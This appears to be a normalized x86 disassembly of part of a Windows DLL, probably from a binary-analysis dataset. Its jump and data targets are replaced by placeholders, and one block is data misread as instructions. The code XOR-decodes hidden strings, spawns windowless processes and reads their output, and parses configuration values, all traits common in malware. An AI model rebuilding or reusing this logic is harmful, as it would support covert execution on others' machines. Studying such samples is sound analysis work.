lea eax [ ebp + 0xc ]
push eax
call sub_10016e7c
add esp 0x10
cmp eax edi
jl r-xdata
push r--data
lea eax [ ebp - 0x3c ]
jmp r-xdata
push r--data
lea eax [ ebp - 0x44 ]
jmp r-xdata
push [ ebp + 0x24 ]
jmp r-xdata
push r--data
lea eax [ ebp - 0x4c ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x1c
push eax
push 0x35
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x18
push eax
push 0x6
jmp r-xdata
push r--data
lea eax [ ebp - 0x54 ]
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0x63
push edi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1001b303
or [ esi ] eax
add esp 0x18
test [ esi ] 0x2
jne r-xdata
push [ ebp + 0x24 ]
mov eax [ ecx ]
push esi
push [ ebp + 0x1c ]
lea edx [ ebp - 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call [ eax + 0x18 ]
mov eax [ ebp - 0x1c ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x18 ]
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
je r-xdata
mov [ ebp + 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0xffffffed
imul eax eax 0x64
push [ ebp + 0x24 ]
push esi
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1006eeca
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1001b303
add esp 0x18
or [ esi ] eax
jmp r-xdata
push edi
jmp r-xdata
push 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x24 ]
dec eax
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov ecx [ ebp + 0x24 ]
imul eax eax 0xc
add [ ecx + 0x8 ] eax
jmp r-xdata
push 0x3b
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp eax 0x45
jge r-xdata
mov ecx [ ebp + 0x24 ]
mov [ ecx + 0x14 ] eax
jmp r-xdata
add eax 0x64
jmp r-xdata
sub_10024da9
or [ ebx ] ecx
push ss
push ss
push ss
push ss
push ss
push ss
push ss
add [ ecx ] al
or al 0xd
or eax 0x16011616
push cs
push ss
push ss
movups xmm2 [ esi ]
adc [ esi ] edx
adc dl [ esi ]
adc [ esi ] dl
push ss
adc edx [ edx - 0x33333334 ]
int3
sub_10024dd0
push ebp
mov ebp esp
sub esp 0x8
push esi
mov esi ecx
test [ esi + 0x40 ] 0x8
push edi
je r-xdata
mov ax [ ebp + 0x8 ]
mov edx 0xffff
cmp dx ax
jne r-xdata
mov edx [ esi + 0x24 ]
mov eax [ edx ]
test eax eax
je r-xdata
mov edx [ esi + 0x24 ]
mov edi [ edx ]
push ebx
test edi edi
je r-xdata
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn 0x4
mov ecx [ esi + 0x3c ]
cmp eax ecx
jae r-xdata
test [ esi + 0x40 ] 0x2
jne r-xdata
mov ecx [ esi + 0x34 ]
mov ebx [ ecx ]
mov edx edi
lea ebx [ edx + ebx * 2 ]
cmp edx ebx
jae r-xdata
mov edi [ esi + 0x34 ]
mov edi [ edi ]
lea eax [ eax + edi * 2 ]
sub eax ecx
mov [ edx ] ecx
mov ecx [ esi + 0x34 ]
sar eax 0x1
mov [ ecx ] eax
pop ebx
pop edi
mov eax 0xffff
pop esi
mov esp ebp
pop ebp
retn 0x4
test edi edi
jne r-xdata
dec [ ecx ]
mov esi [ esi + 0x24 ]
mov ecx [ esi ]
pop ebx
lea edx [ ecx + 0x2 ]
mov [ esi ] edx
pop edi
mov [ ecx ] ax
pop esi
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x34 ]
mov ebx [ eax ]
mov ecx [ esi + 0x10 ]
add ebx ebx
sub ebx [ ecx ]
add ebx edi
sar ebx 0x1
xor ebx ebx
jmp r-xdata
test eax eax
je r-xdata
mov eax 0x20
jmp r-xdata
mov eax ebx
shr eax 0x1
cmp eax 0x20
jae r-xdata
lea ecx [ ecx ]
mov edx 0x7fffffff
sub edx eax
cmp edx ebx
jae r-xdata
test eax eax
jne r-xdata
shr eax 0x1
jne r-xdata
add eax ebx
push eax
lea ecx [ esi + 0x44 ]
mov [ ebp - 0x4 ] eax
call sub_1006a460
mov edi eax
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
mov [ ebp - 0x8 ] ecx
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
mov [ esi + 0x3c ] edi
mov [ eax ] edi
mov edx [ esi + 0x24 ]
mov eax [ ebp - 0x4 ]
mov [ edx ] edi
lea edx [ eax + eax ]
mov eax [ esi + 0x34 ]
sar edx 0x1
mov [ eax ] edx
test [ esi + 0x40 ] 0x4
jne r-xdata
lea edx [ ebx + ebx ]
push edx
push ecx
push edi
call sub_1007f5d0
mov ecx [ ebp - 0x8 ]
add esp 0xc
test ebx ebx
jne r-xdata
mov edx [ esi + 0x10 ]
mov [ edx ] edi
mov eax [ esi + 0x20 ]
mov [ eax ] 0x0
mov edx [ esi + 0x30 ]
sar edi 0x1
mov [ edx ] edi
jmp r-xdata
mov eax [ esi + 0x10 ]
mov [ eax ] edi
mov edx [ esi + 0x20 ]
mov [ edx ] edi
mov eax [ esi + 0x30 ]
mov [ eax ] 0x1
jmp r-xdata
mov edx [ esi + 0x3c ]
sub edx ecx
sar edx 0x1
lea eax [ edi + edx * 2 ]
mov edx [ esi + 0x24 ]
mov [ esi + 0x3c ] eax
mov eax [ edx ]
mov edx [ esi + 0x14 ]
mov ebx [ edx ]
sub ebx ecx
sub eax ecx
sar ebx 0x1
sar eax 0x1
lea ebx [ edi + ebx * 2 ]
mov [ edx ] ebx
mov edx [ esi + 0x24 ]
lea eax [ edi + eax * 2 ]
mov [ edx ] eax
mov edx [ ebp - 0x4 ]
add edx edx
sub edx eax
mov eax [ esi + 0x34 ]
add edx edi
sar edx 0x1
mov [ eax ] edx
test [ esi + 0x40 ] 0x4
je r-xdata
test [ esi + 0x40 ] 0x1
je r-xdata
mov edx [ esi + 0x20 ]
mov edx [ edx ]
mov eax [ esi + 0x24 ]
mov eax [ eax ]
mov ebx [ esi + 0x10 ]
sub edx ecx
sar edx 0x1
lea edx [ edi + edx * 2 ]
mov [ ebx ] edi
mov edi [ esi + 0x20 ]
sub eax edx
mov [ edi ] edx
mov edx [ esi + 0x30 ]
add eax 0x2
sar eax 0x1
mov [ edx ] eax
mov eax [ esi + 0x34 ]
or [ esi + 0x40 ] 0x1
dec [ eax ]
mov esi [ esi + 0x24 ]
mov ecx [ esi ]
lea eax [ ecx + 0x2 ]
mov [ esi ] eax
mov ax [ ebp + 0x8 ]
pop ebx
pop edi
mov [ ecx ] ax
pop esi
mov esp ebp
pop ebp
retn 0x4
push ecx
call sub_100187af
add esp 0x4
sub_10024fc0
mov eax [ esi ]
push edi
mov edi [ LocalFree@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call edi
mov [ esi ] 0x0
pop edi
retn
push eax
call edi
mov [ esi + 0x4 ] 0x0
sub_10024fe9
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
pop edi
mov [ ebp - 0x4 ] eax
pop esi
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov [ ebp - 0xc ] 0x1994000
sub_10025035
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push ebx
xor ebx ebx
cmp ecx ebx
jbe r-xdata
imul ecx [ ebp + 0x10 ]
push esi
push edi
mov esi ecx
cmp [ ebp + 0x8 ] ebx
je r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0x10 ]
jae r-xdata
push esi
push [ ebp + 0x8 ]
call sub_10026155
mov edi eax
pop ecx
pop ecx
test edi edi
je r-xdata
push [ ebp + 0x8 ]
call sub_100695d3
pop ecx
mov ebx eax
call sub_1006299d
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
mov eax edi
pop edi
pop esi
cmp ebx esi
jae r-xdata
pop ebx
pop ebp
retn
sub esi ebx
push esi
push 0x0
add ebx edi
push ebx
call sub_1007f940
add esp 0xc
sub_100250a3
mov edi edi
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
push eax
push r--data
lea eax [ ebp - 0x44 ]
push 0x40
push eax
mov ebx ecx
call sub_1005c1c5
push eax
lea eax [ ebp - 0x44 ]
push eax
push [ ebp + 0x18 ]
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push ebx
call sub_1004883d
mov ecx [ ebp - 0x4 ]
add esp 0x30
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn 0x18
sub_10025120
push ebp
mov ebp esp
sub esp 0x30c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ rw-data ]
push edi
xor ebx ebx
push 0x208
lea eax [ ebp - 0x280 ]
push ebx
push eax
mov [ ebp - 0x2b4 ] ebx
call sub_1007f940
mov ecx [ r--data ]
add esp 0xc
mov [ ebp - 0x284 ] ebx
xor eax eax
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x60
and edx 0xff
mov [ ebp + eax * 2 - 0x48 ] dx
inc eax
cmp eax 0x9
jb r-xdata
lea ecx [ ebp - 0x48 ]
push ecx
xor eax eax
add esi 0xda0
push esi
mov [ ebp - 0x36 ] ax
call [ StrStrIW@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor al al
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn
push ebx
lea edx [ ebp - 0x2c0 ]
push edx
lea eax [ ebp - 0x2a4 ]
push eax
lea ecx [ ebp - 0x288 ]
push ecx
mov [ ebp - 0x2c0 ] 0xc
mov [ ebp - 0x2b8 ] 0x1
mov [ ebp - 0x2bc ] ebx
call [ CreatePipe@IAT ]
test eax eax
je r-xdata
mov al 0x1
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x288 ]
push ebx
push 0x1
push edx
call [ SetHandleInformation@IAT ]
test eax eax
je r-xdata
push 0x44
lea eax [ ebp - 0x308 ]
push ebx
push eax
call sub_1007f940
or [ ebp - 0x2dc ] 0x100
xor eax eax
mov [ ebp - 0x2a0 ] eax
mov [ ebp - 0x29c ] eax
mov [ ebp - 0x298 ] eax
mov [ ebp - 0x294 ] eax
mov eax [ ebp - 0x2a4 ]
mov [ ebp - 0x2c8 ] eax
mov [ ebp - 0x2cc ] eax
add esp 0xc
lea edx [ ebp - 0x74 ]
mov eax 0x1
mov [ ebp - 0x308 ] 0x44
call sub_10049e00
push 0x104
lea ecx [ ebp - 0x280 ]
push ecx
push edx
call [ ExpandEnvironmentStringsW@IAT ]
lea edx [ ebp - 0x60 ]
mov eax 0x1a
call sub_10049e00
mov esi [ CreateProcessW@IAT ]
lea eax [ ebp - 0x2a0 ]
push eax
lea ecx [ ebp - 0x308 ]
push ecx
push ebx
push ebx
push 0x8000000
push 0x1
push ebx
push ebx
push edx
lea eax [ ebp - 0x280 ]
push eax
call esi
test eax eax
je r-xdata
mov ecx [ ebp - 0x2a0 ]
mov edi [ WaitForSingleObject@IAT ]
push 0xffffffff
push ecx
call edi
mov ecx [ ebp - 0x288 ]
push ebx
mov ebx [ ReadFile@IAT ]
lea edx [ ebp - 0x284 ]
push edx
push 0x14
lea eax [ ebp - 0x34 ]
push eax
push ecx
call ebx
mov edx [ ebp - 0x284 ]
push 0x1d4c0
mov [ ebp + edx - 0x34 ] 0x0
call [ Sleep@IAT ]
push 0x44
lea eax [ ebp - 0x308 ]
push 0x0
push eax
call sub_1007f940
or [ ebp - 0x2dc ] 0x100
add esp 0xc
lea ecx [ ebp - 0x2a0 ]
push ecx
lea edx [ ebp - 0x308 ]
push edx
push 0x0
push 0x0
xor eax eax
push 0x8000000
push 0x1
mov [ ebp - 0x2a0 ] eax
mov [ ebp - 0x29c ] eax
mov [ ebp - 0x298 ] eax
mov [ ebp - 0x294 ] eax
mov eax [ ebp - 0x2a4 ]
push 0x0
mov [ ebp - 0x2c8 ] eax
mov [ ebp - 0x2cc ] eax
push 0x0
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x280 ]
push ecx
mov [ ebp - 0x308 ] 0x44
call esi
test eax eax
je r-xdata
mov edx [ ebp - 0x2a0 ]
push 0xffffffff
push edx
call edi
mov edx [ ebp - 0x288 ]
xor edi edi
push edi
lea eax [ ebp - 0x284 ]
push eax
push 0x14
lea ecx [ ebp - 0x20 ]
push ecx
push edx
mov [ ebp - 0x284 ] edi
call ebx
mov eax [ ebp - 0x284 ]
mov [ ebp + eax - 0x20 ] 0x0
xor esi esi
jmp r-xdata
movsx ecx [ ebp + esi - 0x34 ]
push ecx
call sub_1000a76c
add esp 0x4
test eax eax
jne r-xdata
mov ebx esi
mov edi edi
inc esi
cmp esi 0x14
jb r-xdata
mov esi edi
inc edi
cmp edi 0x14
jb r-xdata
mov ebx edi
jmp r-xdata
mov dl [ eax + edi ]
xor dl cl
xor dl 0xc1
inc cl
mov [ ebp + eax - 0xc ] dl
movzx eax cl
cmp eax 0x5
jb r-xdata
lea eax [ ebp - 0x290 ]
push eax
lea ecx [ ebp - 0x2a8 ]
push ecx
lea edx [ ebp - 0xc ]
push edx
lea eax [ ebp + ebx - 0x34 ]
push eax
mov [ ebp - 0x7 ] 0x0
call sub_100352fc
lea ecx [ ebp - 0x28c ]
push ecx
lea edx [ ebp - 0x2b0 ]
push edx
lea eax [ ebp - 0xc ]
push eax
lea ecx [ ebp + esi - 0x20 ]
push ecx
call sub_100352fc
mov edx [ ebp - 0x2b0 ]
add esp 0x20
sub edx [ ebp - 0x2a8 ]
je r-xdata
movsx edx [ ebp + edi - 0x20 ]
push edx
call sub_1000a76c
add esp 0x4
test eax eax
jne r-xdata
mov esi [ ebp - 0x2b4 ]
jmp r-xdata
mov ecx [ ebp - 0x28c ]
sub ecx [ ebp - 0x290 ]
cmp ecx 0x2
jge r-xdata
mov eax [ ebp - 0x28c ]
sub eax [ ebp - 0x290 ]
add eax 0x3c
cmp eax 0x2
jge r-xdata
mov edi [ r--data ]
xor cl cl
xor eax eax
lea esp [ esp ]
mov al 0x1
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_100254d0
push ebp
mov ebp esp
push 0xffffffff
push sub_1008912d
mov eax [ fs : 0x0 ]
push eax
sub esp 0x92c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor edi edi
mov esi ecx
mov [ ebp - 0x92c ] esi
mov [ ebp - 0x8e0 ] edi
mov [ ebp - 0x8dc ] edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x918 ] edi
mov [ ebp - 0x914 ] edi
mov [ ebp - 0x8e8 ] edi
mov [ ebp - 0x8e4 ] edi
mov [ ebp - 0x908 ] edi
mov [ ebp - 0x904 ] edi
mov [ ebp - 0x8f8 ] edi
mov [ ebp - 0x8f4 ] edi
mov [ ebp - 0x900 ] edi
mov [ ebp - 0x8fc ] edi
mov [ ebp - 0x8f0 ] edi
mov [ ebp - 0x8ec ] edi
mov [ ebp - 0x8d8 ] edi
mov [ ebp - 0x8d4 ] edi
mov [ ebp - 0x920 ] edi
mov [ ebp - 0x91c ] edi
mov [ ebp - 0x910 ] edi
mov [ ebp - 0x90c ] edi
mov [ ebp - 0x928 ] edi
mov [ ebp - 0x924 ] edi
mov [ ebp - 0x4 ] 0xa
cmp esi edi
jne r-xdata
lea edx [ ebp - 0x104 ]
mov eax 0x133
call sub_10045930
push esi
lea edx [ ebp - 0x8e0 ]
lea ecx [ ebp - 0x104 ]
call sub_10062be0
test eax eax
je r-xdata
lea esi [ ebp - 0x928 ]
call sub_1002b580
lea esi [ ebp - 0x910 ]
call sub_1002b580
lea esi [ ebp - 0x920 ]
call sub_1002b580
lea esi [ ebp - 0x8d8 ]
call sub_1002b580
lea esi [ ebp - 0x8f0 ]
call sub_1002b580
lea esi [ ebp - 0x900 ]
call sub_1002b580
lea esi [ ebp - 0x8f8 ]
call sub_1002b580
lea esi [ ebp - 0x908 ]
call sub_1002b580
lea esi [ ebp - 0x8e8 ]
call sub_1002b580
lea esi [ ebp - 0x918 ]
call sub_1002b580
lea esi [ ebp - 0x8e0 ]
call sub_1002b580
lea eax [ edi + 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x8e0 ]
mov ecx [ eax ]
push ecx
call [ StrToIntW@IAT ]
mov [ rw-data ] eax
lea edx [ ebp - 0x1b8 ]
mov eax 0x3a
call sub_10045930
push esi
lea edx [ ebp - 0x918 ]
lea ecx [ ebp - 0x1b8 ]
call sub_10062be0
test eax eax
je r-xdata
lea esi [ ebp - 0x928 ]
call sub_1002b580
lea esi [ ebp - 0x910 ]
call sub_1002b580
lea esi [ ebp - 0x920 ]
call sub_1002b580
lea esi [ ebp - 0x8d8 ]
call sub_1002b580
lea esi [ ebp - 0x8f0 ]
call sub_1002b580
lea esi [ ebp - 0x900 ]
call sub_1002b580
lea esi [ ebp - 0x8f8 ]
call sub_1002b580
lea esi [ ebp - 0x908 ]
call sub_1002b580
lea esi [ ebp - 0x8e8 ]
call sub_1002b580
lea esi [ ebp - 0x918 ]
call sub_1002b580
lea esi [ ebp - 0x8e0 ]
call sub_1002b580
mov eax 0x2
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x918 ]
mov esi [ edx ]
mov eax rw-data
xor ebx ebx
mov edx 0x104
sub esi eax
lea esi [ ebp - 0x928 ]
call sub_1002b580
lea esi [ ebp - 0x910 ]
call sub_1002b580
lea esi [ ebp - 0x920 ]
call sub_1002b580
lea esi [ ebp - 0x8d8 ]
call sub_1002b580
lea esi [ ebp - 0x8f0 ]
call sub_1002b580
lea esi [ ebp - 0x900 ]
call sub_1002b580
lea esi [ ebp - 0x8f8 ]
call sub_1002b580
lea esi [ ebp - 0x908 ]
call sub_1002b580
lea esi [ ebp - 0x8e8 ]
call sub_1002b580
lea esi [ ebp - 0x918 ]
call sub_1002b580
lea esi [ ebp - 0x8e0 ]
call sub_1002b580
mov eax 0x3
jmp r-xdata
cmp edx edi
jne r-xdata
movzx ecx [ esi + eax ]
cmp cx di
je r-xdata
xor edx edx
mov [ eax ] dx
cmp ebx edi
jge r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea edx [ ebp - 0x144 ]
mov eax 0xb
call sub_10045930
mov eax [ ebp - 0x92c ]
push eax
lea edx [ ebp - 0x8e8 ]
lea ecx [ ebp - 0x144 ]
call sub_10062be0
test eax eax
je r-xdata
lea esi [ ebp - 0x928 ]
call sub_1002b580
lea esi [ ebp - 0x910 ]
call sub_1002b580
lea esi [ ebp - 0x920 ]
call sub_1002b580
lea esi [ ebp - 0x8d8 ]
call sub_1002b580
lea esi [ ebp - 0x8f0 ]
call sub_1002b580
lea esi [ ebp - 0x900 ]
call sub_1002b580
lea esi [ ebp - 0x8f8 ]
call sub_1002b580
lea esi [ ebp - 0x908 ]
call sub_1002b580
lea esi [ ebp - 0x8e8 ]
call sub_1002b580
lea esi [ ebp - 0x918 ]
call sub_1002b580
lea esi [ ebp - 0x8e0 ]
call sub_1002b580
mov eax 0x4
jmp r-xdata
lea ecx [ edx + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x8e8 ]
mov esi [ ecx ]
mov eax rw-data
xor ebx ebx
mov edx 0x104
sub esi eax
lea esi [ ebp - 0x928 ]
call sub_1002b580
lea esi [ ebp - 0x910 ]
call sub_1002b580
lea esi [ ebp - 0x920 ]
call sub_1002b580
lea esi [ ebp - 0x8d8 ]
call sub_1002b580
lea esi [ ebp - 0x8f0 ]
call sub_1002b580
lea esi [ ebp - 0x900 ]
call sub_1002b580
lea esi [ ebp - 0x8f8 ]
call sub_1002b580
lea esi [ ebp - 0x908 ]
call sub_1002b580
lea esi [ ebp - 0x8e8 ]
call sub_1002b580
lea esi [ ebp - 0x918 ]
call sub_1002b580
lea esi [ ebp - 0x8e0 ]
call sub_1002b580
mov eax 0x5
jmp r-xdata
cmp edx edi
jne r-xdata
movzx ecx [ esi + eax ]
cmp cx di
je r-xdata
xor edx edx
mov [ eax ] dx
cmp ebx edi
jge r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea edx [ ebp - 0x18c ]
mov eax 0xe7
call sub_10045930
mov eax [ ebp - 0x92c ]
push eax
lea edx [ ebp - 0x908 ]
lea ecx [ ebp - 0x18c ]
call sub_10062be0
test eax eax
je r-xdata
lea esi [ ebp - 0x928 ]
call sub_1002b580
lea esi [ ebp - 0x910 ]
call sub_1002b580
lea esi [ ebp - 0x920 ]
call sub_1002b580
lea esi [ ebp - 0x8d8 ]
call sub_1002b580
lea esi [ ebp - 0x8f0 ]
call sub_1002b580
lea esi [ ebp - 0x900 ]
call sub_1002b580
lea esi [ ebp - 0x8f8 ]
call sub_1002b580
lea esi [ ebp - 0x908 ]
call sub_1002b580
lea esi [ ebp - 0x8e8 ]
call sub_1002b580
lea esi [ ebp - 0x918 ]
call sub_1002b580
lea esi [ ebp - 0x8e0 ]
call sub_1002b580
mov eax 0x6
jmp r-xdata
lea ecx [ edx + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x908 ]
mov esi [ ecx ]
mov eax rw-data
xor ebx ebx
mov edx 0x104
sub esi eax
lea esi [ ebp - 0x928 ]
call sub_1002b580
lea esi [ ebp - 0x910 ]
call sub_1002b580
lea esi [ ebp - 0x920 ]
call sub_1002b580
lea esi [ ebp - 0x8d8 ]
call sub_1002b580
lea esi [ ebp - 0x8f0 ]
call sub_1002b580
lea esi [ ebp - 0x900 ]
call sub_1002b580
lea esi [ ebp - 0x8f8 ]
call sub_1002b580
lea esi [ ebp - 0x908 ]
call sub_1002b580
lea esi [ ebp - 0x8e8 ]
call sub_1002b580
lea esi [ ebp - 0x918 ]
call sub_1002b580
lea esi [ ebp - 0x8e0 ]
call sub_1002b580
mov eax 0x7
jmp r-xdata
cmp edx edi
jne r-xdata
movzx ecx [ esi + eax ]
cmp cx di
je r-xdata
xor edx edx
mov [ eax ] dx
cmp ebx edi
jge r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea edx [ ebp - 0x124 ]
mov eax 0x10e
call sub_10045930
mov ebx [ ebp - 0x92c ]
push ebx
lea edx [ ebp - 0x8f8 ]
lea ecx [ ebp - 0x124 ]
call sub_10062be0
test eax eax
jne r-xdata
lea esi [ ebp - 0x928 ]
call sub_1002b580
lea esi [ ebp - 0x910 ]
call sub_1002b580
lea esi [ ebp - 0x920 ]
call sub_1002b580
lea esi [ ebp - 0x8d8 ]
call sub_1002b580
lea esi [ ebp - 0x8f0 ]
call sub_1002b580
lea esi [ ebp - 0x900 ]
call sub_1002b580
lea esi [ ebp - 0x8f8 ]
call sub_1002b580
lea esi [ ebp - 0x908 ]
call sub_1002b580
lea esi [ ebp - 0x8e8 ]
call sub_1002b580
lea esi [ ebp - 0x918 ]
call sub_1002b580
lea esi [ ebp - 0x8e0 ]
call sub_1002b580
mov eax 0x8
jmp r-xdata
lea ecx [ edx + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
lea edx [ ebp - 0x3c ]
mov eax 0x52
call sub_10045930
push ebx
lea edx [ ebp - 0x900 ]
lea ecx [ ebp - 0x3c ]
call sub_10062be0
test eax eax
jne r-xdata
mov eax [ ebp - 0x8f8 ]
mov ecx [ eax ]
push ecx
call sub_10003f1e
add esp 0x4
mov [ rw-data ] eax
mov [ rw-data ] edx
lea edx [ ebp - 0xcc ]
mov eax 0x15
call sub_10045930
push ebx
lea edx [ ebp - 0x8f0 ]
lea ecx [ ebp - 0xcc ]
call sub_10062be0
test eax eax
jne r-xdata
mov edx [ ebp - 0x900 ]
mov esi [ edx ]
mov eax rw-data
mov edx 0x104
sub esi eax
lea esp [ esp ]
lea edx [ ebp - 0xe8 ]
mov eax 0xad
call sub_10045930
push ebx
lea edx [ ebp - 0x8d8 ]
lea ecx [ ebp - 0xe8 ]
call sub_10062be0
test eax eax
jne r-xdata
mov eax [ ebp - 0x8f0 ]
mov ecx [ eax ]
push ecx
call sub_10035937
add esp 0x4
mov [ rw-data ] eax
cmp edx edi
jne r-xdata
movzx ecx [ esi + eax ]
cmp cx di
je r-xdata
lea edx [ ebp - 0x94 ]
mov eax 0x103
call sub_10045930
push ebx
lea edx [ ebp - 0x920 ]
lea ecx [ ebp - 0x94 ]
call sub_10062be0
test eax eax
jne r-xdata
mov edx [ ebp - 0x8d8 ]
mov eax [ edx ]
push eax
call sub_10035937
add esp 0x4
mov [ rw-data ] eax
xor edx edx
mov [ eax ] dx
sub eax 0x2
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea edx [ ebp - 0xb0 ]
mov eax 0xb0
call sub_10045930
push ebx
lea edx [ ebp - 0x910 ]
lea ecx [ ebp - 0xb0 ]
call sub_10062be0
test eax eax
jne r-xdata
mov ecx [ ebp - 0x920 ]
mov edx [ ecx ]
push edx
call sub_1003bfca
fstp [ rw-data ]
add esp 0x4
lea ecx [ edx + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
mov [ ebp - 0x938 ] edi
mov [ ebp - 0x934 ] edi
lea edx [ ebp - 0x64 ]
mov eax 0xb5
mov [ ebp - 0x4 ] 0xb
call sub_10045930
push ebx
lea edx [ ebp - 0x938 ]
lea ecx [ ebp - 0x64 ]
call sub_10062be0
test eax eax
jne r-xdata
mov eax [ ebp - 0x910 ]
mov ecx [ eax ]
push ecx
call sub_1003bfca
fstp [ rw-data ]
add esp 0x4
lea edx [ ebp - 0x8d0 ]
mov eax 0x46
call sub_10045930
lea edx [ ebp - 0x7c ]
mov eax 0xbd
call sub_10045930
lea edx [ ebp - 0x168 ]
mov eax 0xbe
call sub_10045930
lea edx [ ebp - 0x28 ]
mov eax 0x57
call sub_10045930
lea edx [ ebp - 0x1c ]
mov eax 0xb9
call sub_10045930
lea edx [ ebp - 0x50 ]
mov eax 0x117
call sub_10045930
lea edx [ ebp - 0x930 ]
mov eax 0x116
call sub_10045930
mov edi 0x7
xor ebx ebx
xor eax eax
mov [ ebp - 0x7d8 ] edi
mov [ ebp - 0x7dc ] ebx
mov [ ebp - 0x7ec ] ax
mov ecx [ ebp - 0x92c ]
push ecx
lea edx [ ebp - 0x928 ]
lea ecx [ ebp - 0x7c ]
mov [ ebp - 0x4 ] 0xc
call sub_10062be0
test eax eax
jne r-xdata
mov edx [ ebp - 0x938 ]
mov edx [ edx ]
push rw-data
call sub_100453a0
jmp r-xdata
push 0x11b8
call sub_1001f84c
add esp 0x4
cmp eax ebx
je r-xdata
mov eax [ ebp - 0x928 ]
lea edx [ ebp - 0x7ec ]
push edx
mov edx [ eax ]
call sub_100453a0
lea esi [ ebp - 0x938 ]
call sub_1002b580
lea esi [ ebp - 0x928 ]
call sub_1002b580
lea esi [ ebp - 0x910 ]
call sub_1002b580
lea esi [ ebp - 0x920 ]
call sub_1002b580
lea esi [ ebp - 0x8d8 ]
call sub_1002b580
lea esi [ ebp - 0x8f0 ]
call sub_1002b580
lea esi [ ebp - 0x900 ]
call sub_1002b580
lea esi [ ebp - 0x8f8 ]
call sub_1002b580
lea esi [ ebp - 0x908 ]
call sub_1002b580
lea esi [ ebp - 0x8e8 ]
call sub_1002b580
lea esi [ ebp - 0x918 ]
call sub_1002b580
lea esi [ ebp - 0x8e0 ]
call sub_1002b580
xor eax eax
push 0x104
lea ecx [ ebp - 0x3c0 ]
push ecx
push 0x0
call [ GetModuleFileNameW@IAT ]
lea edx [ ebp - 0x3c0 ]
push edx
call [ PathRemoveFileSpecW@IAT ]
cmp [ ebp - 0x7dc ] 0x0
jne r-xdata
mov ecx rw-data
mov esi eax
call sub_10021dc0
mov ebx eax
xor ecx ecx
mov [ ebp - 0x7f4 ] edi
mov [ ebp - 0x7f8 ] 0x0
mov [ ebp - 0x808 ] cx
